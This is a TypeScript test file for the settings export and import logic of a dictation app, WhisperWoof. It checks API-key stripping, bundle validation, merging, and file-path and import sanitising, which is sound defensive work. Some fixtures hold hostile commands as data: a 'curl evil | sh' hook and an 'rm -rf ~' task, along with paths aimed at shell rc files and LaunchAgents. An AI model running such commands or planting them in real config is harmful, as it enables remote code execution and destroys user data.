/**
 * Tests for Settings Export / Import pure logic.
 *
 * Imports `EXPORT_VERSION`, `stripApiKeys`, `validateBundle`, and
 * `mergeArrays` directly from `bridge/settings-export-pure.js`. These are
 * the same helpers `exportSettings` / `importSettings` in the main file
 * delegate to — previously they were inlined and the test kept parallel
 * copies, so the API-key stripping and bundle validation could drift
 * silently between production and tests.
 */

import { describe, it, expect } from "vitest";
import {
  EXPORT_VERSION,
  stripApiKeys,
  validateBundle,
  mergeArrays,
  isJsonFilePath,
  exportFileName,
  parseImportFile,
  toExportBundle,
} from "../../bridge/settings-export-pure";

interface ExportBundle {
  version: number;
  exportedAt: string;
  appName: string;
  data: Record<string, unknown>;
}

describe("validateBundle", () => {
  it("accepts a valid WhisperWoof bundle", () => {
    const bundle: ExportBundle = {
      version: EXPORT_VERSION,
      exportedAt: new Date().toISOString(),
      appName: "WhisperWoof",
      data: { snippets: [] },
    };
    expect(validateBundle(bundle)).toBeNull();
  });

  it("rejects null", () => {
    expect(validateBundle(null)).toContain("missing data");
  });

  it("rejects a bundle with no `data` field", () => {
    expect(validateBundle({ appName: "WhisperWoof" })).toContain("missing data");
  });

  it("rejects a bundle with the wrong appName", () => {
    expect(validateBundle({ appName: "OtherApp", data: {} })).toContain("not a WhisperWoof");
    expect(validateBundle({ appName: "SuperWhisper", data: {} })).toContain("not a WhisperWoof");
  });
});

describe("stripApiKeys", () => {
  // These are the EXACT keys the app actually writes to localStorage in
  // src/stores/settingsStore.ts. If this test ever stops catching one of
  // them, the settings-export flow will leak an API key to disk.
  it("strips every camelCase ApiKey the app actually writes to localStorage", () => {
    const prefs = {
      openaiApiKey: "sk-openai-secret",
      anthropicApiKey: "sk-ant-secret",
      geminiApiKey: "aiza-gemini-secret",
      groqApiKey: "gsk-groq-secret",
      mistralApiKey: "ms-mistral-secret",
      customTranscriptionApiKey: "custom-stt-secret",
      customReasoningApiKey: "custom-llm-secret",
      "whisperwoof-polish-preset": "clean",
      "whisperwoof-polish-provider": "ollama",
    };
    const safe = stripApiKeys(prefs);
    expect(safe).not.toHaveProperty("openaiApiKey");
    expect(safe).not.toHaveProperty("anthropicApiKey");
    expect(safe).not.toHaveProperty("geminiApiKey");
    expect(safe).not.toHaveProperty("groqApiKey");
    expect(safe).not.toHaveProperty("mistralApiKey");
    expect(safe).not.toHaveProperty("customTranscriptionApiKey");
    expect(safe).not.toHaveProperty("customReasoningApiKey");
    expect(safe).toHaveProperty("whisperwoof-polish-preset", "clean");
    expect(safe).toHaveProperty("whisperwoof-polish-provider", "ollama");
  });

  it("strips kebab-case api-key fields too", () => {
    const prefs = {
      "whisperwoof-openai-api-key": "sk-secret",
      "some-api_key": "legacy",
      "polish-preset": "clean",
    };
    const safe = stripApiKeys(prefs);
    expect(safe).not.toHaveProperty("whisperwoof-openai-api-key");
    expect(safe).not.toHaveProperty("some-api_key");
    expect(safe).toHaveProperty("polish-preset", "clean");
  });

  it("strips token / secret / bearer fields", () => {
    const prefs = {
      "telegram-bot-token": "123:ABC",
      supabaseServiceSecret: "srv-secret",
      authBearer: "bearer-tok",
      "normal-setting": "value",
    };
    const safe = stripApiKeys(prefs);
    expect(safe).not.toHaveProperty("telegram-bot-token");
    expect(safe).not.toHaveProperty("supabaseServiceSecret");
    expect(safe).not.toHaveProperty("authBearer");
    expect(safe).toHaveProperty("normal-setting");
  });

  it("is case-insensitive (catches APIKEY, ApiKey, apikey)", () => {
    const prefs = {
      APIKEY: "1",
      ApiKey: "2",
      apikey: "3",
      FooApiKey: "4",
      regular: "ok",
    };
    const safe = stripApiKeys(prefs);
    expect(safe).not.toHaveProperty("APIKEY");
    expect(safe).not.toHaveProperty("ApiKey");
    expect(safe).not.toHaveProperty("apikey");
    expect(safe).not.toHaveProperty("FooApiKey");
    expect(safe).toHaveProperty("regular");
  });

  it("handles empty prefs", () => {
    expect(stripApiKeys({})).toEqual({});
  });

  it("does not mutate the original object", () => {
    const prefs = { openaiApiKey: "sk-test", preset: "clean" };
    const safe = stripApiKeys(prefs);
    expect(prefs).toHaveProperty("openaiApiKey");
    expect(safe).not.toHaveProperty("openaiApiKey");
  });

  it("returns an empty object for null / undefined input", () => {
    expect(stripApiKeys(null)).toEqual({});
    expect(stripApiKeys(undefined)).toEqual({});
  });
});

describe("mergeArrays", () => {
  it("appends new items from incoming", () => {
    const existing = [{ id: "1", trigger: "my email" }];
    const incoming = [{ id: "2", trigger: "standup" }];
    const { merged, added } = mergeArrays(existing, incoming);
    expect(merged).toHaveLength(2);
    expect(added).toBe(1);
  });

  it("deduplicates by id", () => {
    const existing = [{ id: "1", trigger: "my email" }];
    const incoming = [{ id: "1", trigger: "my email" }, { id: "2", trigger: "standup" }];
    const { merged, added } = mergeArrays(existing, incoming);
    expect(merged).toHaveLength(2);
    expect(added).toBe(1);
  });

  it("deduplicates by word (vocabulary items)", () => {
    const existing = [{ word: "WhisperWoof" }];
    const incoming = [{ word: "WhisperWoof" }, { word: "Mando" }];
    const { merged, added } = mergeArrays(existing, incoming);
    expect(merged).toHaveLength(2);
    expect(added).toBe(1);
  });

  it("deduplicates by trigger (snippet items)", () => {
    const existing = [{ trigger: "my email" }];
    const incoming = [{ trigger: "my email" }];
    const { merged, added } = mergeArrays(existing, incoming);
    expect(merged).toHaveLength(1);
    expect(added).toBe(0);
  });

  it("handles an empty existing list", () => {
    const { merged, added } = mergeArrays([], [{ id: "1" }, { id: "2" }]);
    expect(merged).toHaveLength(2);
    expect(added).toBe(2);
  });

  it("handles an empty incoming list", () => {
    const { merged, added } = mergeArrays([{ id: "1" }], []);
    expect(merged).toHaveLength(1);
    expect(added).toBe(0);
  });

  it("treats non-array inputs as empty", () => {
    const { merged, added } = mergeArrays(null, undefined);
    expect(merged).toEqual([]);
    expect(added).toBe(0);
  });
});

describe("EXPORT_VERSION", () => {
  it("is currently version 1", () => {
    expect(EXPORT_VERSION).toBe(1);
  });
});

describe("isJsonFilePath", () => {
  it("accepts .json files, any case", () => {
    expect(isJsonFilePath("/Users/me/Documents/whisperwoof-settings.json")).toBe(true);
    expect(isJsonFilePath("/Users/me/Backup.JSON")).toBe(true);
  });

  it("rejects shell rc files and other non-JSON targets", () => {
    expect(isJsonFilePath("/Users/me/.zshrc")).toBe(false);
    expect(isJsonFilePath("/Users/me/Library/LaunchAgents/evil.plist")).toBe(false);
    expect(isJsonFilePath("/Users/me/run.json.sh")).toBe(false);
  });

  it("rejects a dotfile literally named .json", () => {
    expect(isJsonFilePath("/Users/me/.json")).toBe(false);
  });

  it("rejects empty and non-string input", () => {
    expect(isJsonFilePath("")).toBe(false);
    expect(isJsonFilePath(undefined)).toBe(false);
    expect(isJsonFilePath(42)).toBe(false);
  });
});

describe("exportFileName", () => {
  it("names the file after the local date", () => {
    expect(exportFileName(new Date(2026, 8, 5))).toBe("whisperwoof-settings-2026-09-05.json");
  });
});

describe("parseImportFile", () => {
  it("returns the parsed bundle", () => {
    const bundle = { appName: "WhisperWoof", data: {} };
    expect(parseImportFile(JSON.stringify(bundle))).toEqual({ success: true, bundle });
  });

  it("does not echo file content in the error", () => {
    const result = parseImportFile("export OPENAI_KEY=sk-live-123");
    expect(result).toEqual({ success: false, error: "Invalid JSON" });
  });

  it("refuses valid JSON that isn't a WhisperWoof export, without returning it", () => {
    const dockerConfig = JSON.stringify({ auths: { "ghcr.io": { auth: "c2VjcmV0" } } });
    const result = parseImportFile(dockerConfig);
    expect(result.success).toBe(false);
    expect(result).not.toHaveProperty("bundle");
    expect(JSON.stringify(result)).not.toContain("c2VjcmV0");
  });
});

describe("toExportBundle", () => {
  it("keeps only the export's own fields, so a file can't gain keys like `hooks`", () => {
    const bundle = {
      version: 1,
      exportedAt: "2026-09-25T00:00:00.000Z",
      appName: "WhisperWoof",
      hooks: { SessionStart: [{ command: "curl evil | sh" }] },
      data: { vocabulary: [{ word: "Mando" }], tasks: ["rm -rf ~"] },
    };
    expect(toExportBundle(bundle)).toEqual({
      version: EXPORT_VERSION,
      exportedAt: "2026-09-25T00:00:00.000Z",
      appName: "WhisperWoof",
      data: { vocabulary: [{ word: "Mando" }] },
    });
  });

  it("strips API keys from preferences again at save time", () => {
    const bundle = {
      appName: "WhisperWoof",
      data: { preferences: { openaiApiKey: "sk-live-123", uiLanguage: "en" } },
    };
    expect(toExportBundle(bundle).data).toEqual({ preferences: { uiLanguage: "en" } });
  });

  it("does not mutate the input", () => {
    const bundle = { appName: "WhisperWoof", extra: true, data: { preferences: { apiKey: "x" } } };
    const snapshot = JSON.parse(JSON.stringify(bundle));
    toExportBundle(bundle);
    expect(bundle).toEqual(snapshot);
  });
});
